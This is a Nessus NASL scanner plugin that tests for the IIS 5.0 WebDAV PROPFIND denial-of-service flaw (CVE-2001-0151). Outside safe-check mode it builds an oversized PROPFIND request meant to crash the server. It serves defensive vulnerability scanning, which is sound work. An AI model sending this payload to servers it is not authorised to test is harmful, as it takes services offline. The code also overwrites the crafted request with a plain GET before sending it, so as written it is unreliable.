#
# This script is based on Georgi Guninski's perl script
# ported to NASL by John Lampe <j_lampe@bellsouth.net>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10667);
 script_bugtraq_id(2453);
 script_cve_id("CVE-2001-0151");
 script_version ("$Revision: 1.23 $");

 name["english"] = "IIS 5.0 PROPFIND Vulnerability";
 script_name(english:name["english"]);

 desc["english"] = "
It was possible to disable the remote IIS server
by making a variation of a specially formed PROPFIND request.
An attacker, exploiting this vulnerability, would be able
to render the web service useless.  If the server is 'business
critical', the impact could be high.

Solution : disable the WebDAV extensions, as well as the PROPFIND command
See 
http://support.microsoft.com/support/kb/articles/Q241/5/20.ASP
See also: 
http://www.microsoft.com/technet/security/bulletin/MS01-016.mspx

Risk factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "Attempts to crash the Microsoft IIS server";
 script_summary(english:summary["english"]);
 script_category(ACT_MIXED_ATTACK); # mixed


 script_copyright(english:"This script is Copyright (C) 2001 John Lampe");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);

if(!get_port_state(port))exit(0);



if(safe_checks())
{
   soc = http_open_socket(port);
   if(!soc)exit(0);
   
   req = string("PROPFIND / HTTP/1.0\r\n\r\n");
   send(socket:soc, data:req);
   r = http_recv(socket:soc);
   
   if("411 Length Required" >< r)
   {
    if(egrep("Server:.*IIS.*", string:r))
    {
    alrt = "
The PROPFIND method is enabled on the remote IIS server.
On unpatched versions of IIS this allows anyone to
remotely shut this server down.  Microsoft included this
patch in Win2k Service Pack 2.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : disable the WebDAV extensions, as well as the PROPFIND
command See 
http://support.microsoft.com/support/kb/articles/Q241/5/20.ASP
also:
http://www.microsoft.com/technet/security/bulletin/MS01-016.mspx
Risk factor : High";

     security_hole(port:port, data:alrt);
    }
   }  
  exit(0);
}


mylen = 59060;
quote = raw_string(0x22);
xml = string ("<?xml version=",
      quote ,
      "1.0",
      quote,
      "?><a:propfind xmlns:a=",
      quote,
      "DAV:",
      quote,
      " xmlns:u=",
      quote,
      crap(length:mylen, data:":"),
      ":", 
      quote,
      ">",
      "<a:prop><a:displayname /><u:",
      "AAAA", 
      crap(length:mylen, data:":"),
      crap(length:64, data:"A"),
      " /></a:prop></a:propfind>\r\n\r\n");

l = strlen(xml);
req = string ("PROPFIND / HTTP/1.1\r\n", 
"Content-type: text/xml\r\n", 
"Host: ", get_host_name() , "\r\n", 
"Content-length: ", l, "\r\n\r\n", xml, "\r\n\r\n\r\n");


soc = http_open_socket(port);
if(!soc)exit(0);
else {
	req = http_get(item:"/", port:port);
	send(socket:soc, data:req);
	r = http_recv(socket:soc);
	http_close_socket(soc);
	if(!r)exit(0);
	}

soc2 = http_open_socket(port);
if(soc2)
{
 send(socket:soc2, data:req);
 r = http_recv(socket:soc2);
 http_close_socket(soc2);
}
else {
	exit(0);
     }

sleep(1);
soc3 = http_open_socket(port);
if(soc3)
{
req = http_get(item:"/", port:port);
send(socket:soc3, data:req);
r = http_recv(socket:soc3);
http_close_socket(soc3);
if(!r){
       security_hole(port);
     }
else {
	if("HTTP/1.1 500 Server Error" >< r)security_hole(port);
     }
}
else 
{
 security_hole(port);
}
